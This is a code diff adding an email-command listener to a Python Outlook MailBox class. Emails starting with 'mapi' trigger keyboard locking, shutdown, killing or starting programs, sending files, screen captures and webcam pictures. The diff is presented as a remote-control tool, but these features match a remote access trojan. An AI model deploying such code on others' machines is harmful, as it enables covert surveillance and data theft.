@@ -1,21 +1,95 @@
+import time
 import win32com.client
 import Email
+import ManagerKeyboard
+import ManagerSystem
+import ManagerScreen
+import ManagerFile
+import ManagerSoft
+import ManagerAudio
+import ManagerWebcam
 
 class MailBox:
-    def __init__(self):
-        outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
-        inbox = outlook.GetDefaultFolder(6)
-        self.mails = inbox.Items
-        print("Init")
+    def __init__(self,factory):
+        print("Mailbox Init")
+        self.factory = factory
+        self.isStart = True
 
-    def getNewMail(self):
-        print("NewMail")
-        return Email.Email(self.mails.GetLast())
+    def utilPath(self,rep):
+        return rep.split("\n")[-1]
 
-    def getUnreadMails(self):
-        result = filter(lambda x : x.UnRead == True,self.mails)
-        mails = list()
-        for message in result:
-            mails.append(Email.Email(message))
-        return mails
+    def listen(self,msg, email,_callBack = None):
+        string = msg.lower().strip().split()
+        rep = ""
+        if "mapi" == string[0]:
+            if "keyboard" == string[1]:
+                keyboard = ManagerKeyboard.ManagerKeyBoard(email)
+                if "lock" == string[2]:
+                    keyboard.lock(_callBack)
+                elif "unlock" == string[2]:
+                    keyboard.unlock(_callBack)
+                elif "state" == string[2]:
+                    keyboard.notificationState(_callBack)
 
+            if "system" == string[1]:
+                system = ManagerSystem.ManagerSystem(email)
+                if "shutdown" == string[2]:
+                    system.shutdown(_callBack)
+                elif "logout" == string[2]:
+                    system.logout(_callBack)
+
+            if "soft" == string[1]:
+                soft = ManagerSoft.ManagerSoft(email)
+                if "list" == string[2]:
+                    soft.list(msg,_callBack)
+                if "kill" == string[2]:
+                    soft.kill(msg,_callBack)
+                if "start" == string[2]:
+                    soft.start(msg,_callBack)
+
+            if "file" == string[1]:
+                file = ManagerFile.ManagerFile(email)
+                if "list" == string[2]:
+                    file.list(msg,_callBack)
+                if "send" == string[2]:
+                    file.send(msg,_callBack)
+
+            if "screen" == string[1]:
+                screen = ManagerScreen.ManagerKeyBoard(email)
+                if "scap" == string[2]:
+                    screen.scap(_callBack)
+
+            if "webcam" == string[1]:
+                cam = ManagerWebcam.ManagerWebcam(email)
+                if "scap" == string[2]:
+                    cam.turnOn(_callBack)
+                    cam.capPicture(_callBack)
+                    cam.turnOff(_callBack)
+                if "on" == string[2]:
+                    cam.turnOn(_callBack)
+                if "off" == string[2]:
+                    cam.turnOff(_callBack)
+            if "audio" == string[1]:
+                audio = ManagerAudio.ManagerAudio(email, email.getFiles())
+                if "play" == string[2]:
+                    audio.play(_callBack)
+                if "stop" == string[2]:
+                    audio.stop(_callBack)
+
+        return msg + "\nREP:\n" + rep
+
+    def start(self,_callBack = None):
+        print("Mailbox Start Enry")
+        while self.isStart:
+            print("Mailbox Start Read Mail")
+            self.mails = self.factory.createMailBox()
+            for mailNow in self.mails:
+                if (mailNow.isValidate()):
+                    rep = self.listen(mailNow.getBody(), mailNow,_callBack)
+                    print("MailBox Start Rep: " + rep)
+                else:
+                    print("False" + mailNow.getBody())
+            time.sleep(5)
+
+    def stop(self):
+        self.isStart = False
